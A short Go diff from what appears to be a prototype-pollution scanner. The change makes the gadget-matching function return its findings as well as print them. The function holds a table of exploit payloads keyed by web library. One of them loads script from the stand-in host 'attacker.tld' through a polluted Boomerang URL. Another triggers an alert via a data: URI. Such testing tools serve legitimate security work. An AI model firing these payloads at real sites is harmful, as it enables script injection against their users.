@@ -92,7 +92,8 @@ var Fingerprint string = `(() => {
 `
 
 // GadGets func
-func Gad(exp, resp, fullurl string) {
+func Gad(exp, resp, fullurl string) []string {
+	var out []string
 	gadgetsPayloads := map[string]string{
 		"Adobe Dynamic Tag Management":  "__proto__[src]data:,alert(1)//",
 		"Akamai Boomerang":              "__proto__[BOOMR]=1&__proto__[url]=//attacker.tld/js.js",
@@ -143,6 +144,8 @@ func Gad(exp, resp, fullurl string) {
 		if strings.Contains(resp, key) {
 			res := fmt.Sprintf("%s Find Payload :> %s%s", key, fullurl, val)
 			fmt.Println(exp + res)
+			out = append(out, fmt.Sprintf("%s :> %s%s", key, fullurl, val))
 		}
 	}
+	return out
 }
